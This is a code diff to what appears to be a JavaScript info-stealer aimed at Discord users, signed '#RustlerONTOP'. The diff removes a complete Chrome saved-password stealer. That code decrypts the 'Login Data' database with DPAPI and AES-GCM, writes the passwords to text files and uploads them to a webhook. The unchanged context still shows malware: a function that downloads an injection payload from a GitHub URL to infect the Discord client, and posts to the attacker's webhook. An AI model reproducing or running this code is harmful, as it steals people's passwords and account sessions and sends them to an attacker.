@@ -41,7 +41,7 @@ discords.forEach(function(file) {
     })
     
 });
-takePizzas();
+
 listDiscords();
 function Infect() {
     https.get('https://raw.githubusercontent.com/ugur014/ajwdbawjdbawjdbawjdbawjd/main/src/Injection/injection-clean', (resp) => {
@@ -162,86 +162,7 @@ function injectNotify() {
         }
         fields.push(c)
     })
-async function getPizzas(path) {
-    let path_split = path.split('\\'),
-        path_split_tail = path.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2),
-        path_tail = path_split_tail.join('\\') + '\\';
-    if (path.startsWith(appdata)) path_tail = path;
-    if (path.includes('cord')) return;
-    if (fs.existsSync(path_tail)) {
-        let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State'))
-                .os_crypt.encrypted_key, 'base64')
-            .slice(5);
-        var login_data = path + 'Login Data',
-            passwords_db = path + 'passwords.db';
-        fs.copyFileSync(login_data, passwords_db);
-        const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
-        var result = '\n\nPASSWORDS FROM: ' + path + '  #RustlerONTOP\n',
-            sql = new sqlite3.Database(passwords_db, err => {
-                if (err) {
-                    if (debug) console.log(err);
-                }
-            });
-        const pizza = await new Promise((resolve, reject) => {
-            sql.each('SELECT origin_url, username_value, password_value FROM logins', function (err, row) {
-                if (err) {
-                    if (debug) console.log(err);
-                }
-                if (row['username_value'] != '') {
-                    let password_value = row['password_value'];
-                    try {
-                        if ((password_value[0] == 1) && (password_value[1] == 0) && (password_value[2] == 0) && (password_value[3] == 0)) {
-                            result += '\nURL: ' + row['origin_url'] + ' | USERNAME: ' + row['username_value'] + ' | PASSWORD: ' + dpapi.unprotectData(password_value, null, 'CurrentUser')
-                                .toString('utf-8');
-                        } else {
-                            let start = password_value.slice(3, 15),
-                                middle = password_value.slice(15, password_value.length - 16),
-                                end = password_value.slice(password_value.length - 16, password_value.length),
-                                decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
-                            decipher.setAuthTag(end);
-                            result += '\nURL: ' + row['origin_url'] + ' | USERNAME: ' + row['username_value'] + ' | PASSWORD: ' + decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8');
-                        }
-                    } catch (e) {
-                        if (debug) console.log(e);
-                    }
-                }
-            }, function () {
-                resolve(result);
-            });
-        });
-        return pizza;
-    } else {
-        return '';
-    }
-}
 
-async function takePizzas() {
-    let passwords = '';
-    for (let i = 0; i < paths.length; i++) {
-        if (fs.existsSync(paths[i] + 'Login Data'))
-            passwords += await getPizzas(paths[i]) || '';
-    }
-    fs.writeFile(appdata + '\\passwords.txt', passwords, function (err, data) {
-
-        if (err) throw err;
-      
-        const form = new FormData();
-        form.append("file", fs.createReadStream(appdata+"\\passwords.txt"));
-        form.submit(webhook, (error, response) => {
-        if (error) console.log(error);
-        });
-    });
-    fs.writeFile(appdata + '\\src-passwords.txt', passwords, function (err, data) {
-
-        if (err) throw err;
-      
-        const form = new FormData();
-        form.append("file", fs.createReadStream(appdata+"\\src-passwords.txt"));
-        form.submit(webhook, (error, response) => {
-        if (error) console.log(error);
-        });
-    });
-}
     axios
 	.post(webhook, {
         "content": null, 
